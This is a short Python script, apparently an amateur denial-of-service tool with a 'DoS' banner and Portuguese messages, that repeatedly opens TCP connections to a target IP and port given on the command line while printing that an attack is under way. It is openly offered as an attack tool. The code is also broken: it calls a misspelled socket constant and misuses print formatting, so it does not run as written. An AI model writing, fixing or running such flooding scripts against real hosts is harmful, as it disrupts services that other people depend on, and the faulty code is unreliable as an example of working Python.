import socket
import sys
import os

main = """

____       ____
|  _ \  ___/ ___|
| | | |/ _ \___ \
| |_| | (_) |__) |
|____/ \___/____/

Powered By CoohCooh\n\n"""

count = 0

def init (ip, port, main):
	client =  socket.socket(socket.AF_INET, socket.Sock_STREAM)
	client.settimeout(0.03)
	code = client.connect_ex((ip, int(port)))
	if code == 0:
		print("[==>] --- REALIZANDO ATAQUE! --- [<==]")
		print("IP: %s, PORT:%s", ip, port)
	else:
		print("Servidor Indisponivel ou Porta Fechada\n\n")
		sys.exit(0)


if len(sys.argv) < 2:
	print('\n\n')
	print("Modo De Uso:")
	print("Use:  python DoS.py IP PORTA QUANTIA")
	print('\n\n')
	sys.exit(0)
else:
	ip = sys.argv[1]
	port = sys.argv[2]
	quantia = int(sys.argv[3])
	while count < quantia:
		count+=1
		init(ip, port, main)
	print("DDos Parada!")
